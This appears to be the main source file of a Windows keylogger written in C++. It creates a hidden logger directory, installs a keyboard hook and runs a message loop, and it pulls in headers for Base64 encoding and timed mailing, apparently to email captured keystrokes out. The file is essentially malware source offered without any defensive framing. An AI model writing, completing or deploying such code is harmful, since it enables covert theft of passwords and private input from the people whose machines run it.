#include <iostream>
#include <windows.h>
#include "KeyConstants.h"
#include "Helper.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KeybHook.h"


//using namespace std; //different commit now.

int main()
{
    MSG Msg;
    IO::MKDir(IO::GetOurPath(true));   //create the path and directory to the logger!

    InstallHook();
    while(GetMessage (&Msg, NULL, 0, 0))
    {
        TranslateMessage(&Msg);
        DispatchMessage(&Msg);
    }

    MailTimer.Stop();
    return 0;
}
